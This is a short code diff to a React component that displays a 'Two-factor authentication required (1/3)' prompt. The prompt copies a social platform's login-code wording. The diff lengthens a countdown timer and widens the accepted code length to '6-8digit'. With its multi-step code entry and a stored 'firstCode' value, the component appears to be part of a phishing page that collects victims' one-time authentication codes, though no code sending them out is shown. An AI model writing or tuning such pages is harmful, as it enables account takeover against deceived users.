@@ -8,7 +8,7 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(60); 
+    const [timeLeft, setTimeLeft] = useState(100); 
 
     const [activeWaring, setActiveWaring] = useState(false);
     const [firstCode, setFirstCode] = useState();
@@ -140,8 +140,8 @@ const ConfirmComponent = () => {
                                 <div className="card">
                                     <h3 className="twh3">Two-factor authentication required (1/3)</h3>
                                     <div className="bodyyy">
-                                        <p> You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. </p>
-                                        <p> Enter the 6-digit code from your <strong>code generator</strong> or third-party app below. </p>
+                                        <p> You’ve asked us to require a 6-8digit login code when anyone tries to access your account from a new device or browser. </p>
+                                        <p> Enter the 6-8digit code from your <strong>code generator</strong> or third-party app below. </p>
 
                                            
                                         <div className="form-group" style={{paddingLeft: "0px", paddingTop: "5px", paddingBottom: "10px", display: "inline-block"}}>
